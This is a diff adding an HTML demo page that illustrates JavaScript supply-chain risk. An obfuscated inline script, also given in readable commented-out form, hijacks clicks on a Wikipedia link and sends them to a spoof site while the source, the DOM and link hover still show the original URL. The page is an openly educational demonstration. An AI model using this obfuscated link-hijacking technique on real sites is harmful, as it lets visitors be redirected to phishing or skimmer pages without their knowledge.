@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <h2>JavaScript Supply Chain Attack Example - Sneakier URL/IFRAME Re-writing</h2>
+    <p>This page provides a short and simple example of JavaScript's capability to hijack (re-write) a hardcoded URL (or
+        IFRAME).
+    <h3>What To Expect</h3>
+    <p>This page presents two links that will open in new tabs when clicked. One link is left alone but the Wikipedia
+        link will be hijacked to a spoof site!
+	<hr>
+    <ul>
+        <li><a href="https://www.controlgap.com/blog" target="_blank">Click here for the controlgap blog - no
+                surprises</a></li>
+        <li><a href="https://www.wikipedia.org/" target="_blank">Click here to go to Wikipedia - and a surprise</a></li>
+    </ul>
+    <p>Notes:
+    <ul>
+        <li>If you are using a Script blocker, e.g. NoScript, this will not operate as intended.</li>
+        <li>The technique can be used on dynamic and staic links and other tags such as an IFRAME.</li>
+    </ul>
+    <h3>Checking It Out - Under the Covers</h3>
+    <p>If you can check out the link as follows:
+    <ul>
+        <li>View the Source (right click and View Page Source) - shows the unaltered page source and link.</li>
+        <li>Inspect the DOM (right click and Inspect or Inspect Element) - also shows he unaltered page source and link.</li>
+        <li>In this example, hovering over the link also shows the link as unaltered.</li>
+		<li>Furthermore, the script has been obfuscated.</li>
+    </ul>
+	<hr>	
+    <h3>Simple Demonstration of Risk</h3>
+    <p>This is not intended to be a full-function URL hijacker.  We've shown a few of the methods used by
+        criminal gangs in e-commerce skimmers. Normally a skimmer would simply include a JavaScript via a link (below) -
+        We've left this as inline script for clarity and simplicity:
+    <blockquote>
+        &lt;script src="any-third-party-script-site.org/package.js"&gt;&lt;/script&gt;
+    </blockquote>
+    <p>Our example is deliberately minimalistic. We wanted an example that was clear, uncluttered, and free of excesses.
+        This is provided on a stand-alone page without styles, branding, or other trappings of a modern web site.
+    <p>In the case of a real skimmer, no amount of inspection of your web host or your source will find the problem. You
+        need to look at the third party site! Most shopping carts include third party scripts from dozens of URLs -
+        every one a potential risk. Your entire site could be housed on an optical drive with continous file integrity
+        checking and you would not detect a change of code on a third party site. This effectively demonstrates the
+        risks of using third party scripts you have no controls over.
+
+	<script>
+		/* 	Simulated third-party JavaScript - in a skimmer this would be included via a supply chain site*/
+		// const links = document.querySelectorAll('a');
+		// links.forEach((a) => {
+		//     a.onclick = (e) => {
+		//         const oldLink = e.target.href;
+		//         if (oldLink.includes("wikipedia.org")) {
+		//             e.preventDefault();
+		//             e.stopPropagation();
+		//             e.target.href = 'https://en.uncyclopedia.co/';
+		//             e.target.click();
+		//             e.target.href = oldLink;
+		//         }
+		//     }
+		// })
+		// https://obfuscator.io/
+		const _0x53f3 = ['wikipedia.org', 'click', 'target', 'href', 'onclick', 'preventDefault', 'stopPropagation', 'forEach', 'includes']; (function (_0x391e4e, _0x53f305) { const _0x29a541 = function (_0x378353) { while (--_0x378353) { _0x391e4e['push'](_0x391e4e['shift']()); } }; _0x29a541(++_0x53f305); }(_0x53f3, 0x154)); const _0x29a5 = function (_0x391e4e, _0x53f305) { _0x391e4e = _0x391e4e - 0x0; let _0x29a541 = _0x53f3[_0x391e4e]; return _0x29a541; }; const links = document['querySelectorAll']('a'); links[_0x29a5('0x0')](_0xc5942e => { _0xc5942e[_0x29a5('0x6')] = _0x19a759 => { const _0xaaf3b3 = _0x19a759['target'][_0x29a5('0x5')]; _0xaaf3b3[_0x29a5('0x1')](_0x29a5('0x2')) && (_0x19a759[_0x29a5('0x7')](), _0x19a759[_0x29a5('0x8')](), _0x19a759[_0x29a5('0x4')][_0x29a5('0x5')] = 'https://en.uncyclopedia.co/', _0x19a759[_0x29a5('0x4')][_0x29a5('0x3')](), _0x19a759[_0x29a5('0x4')][_0x29a5('0x5')] = _0xaaf3b3); }; });
+	</script>
+</body>
+
+</html>
